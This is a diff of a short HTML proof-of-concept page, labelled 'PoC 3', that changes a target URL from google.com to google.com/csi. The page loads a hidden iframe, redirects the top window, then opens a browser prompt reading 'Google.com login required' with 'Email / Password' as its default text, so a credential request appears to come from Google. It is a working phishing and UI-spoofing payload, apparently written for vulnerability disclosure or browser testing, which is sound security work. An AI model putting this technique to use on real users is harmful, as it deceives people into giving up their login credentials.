@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html><body>
 <h2>PoC 3: iframe warmup + redirect + prompt()</h2>
-<iframe src="http://www.google.com" style="display:none;"></iframe>
+<iframe src="http://www.google.com/csi" style="display:none;"></iframe>
 <script>
 setTimeout(() => {
-  top.location = "http://www.google.com";
+  top.location = "http://www.google.com/csi";
   setTimeout(() => {
     prompt("Google.com login required", "Email / Password");
   }, 800);
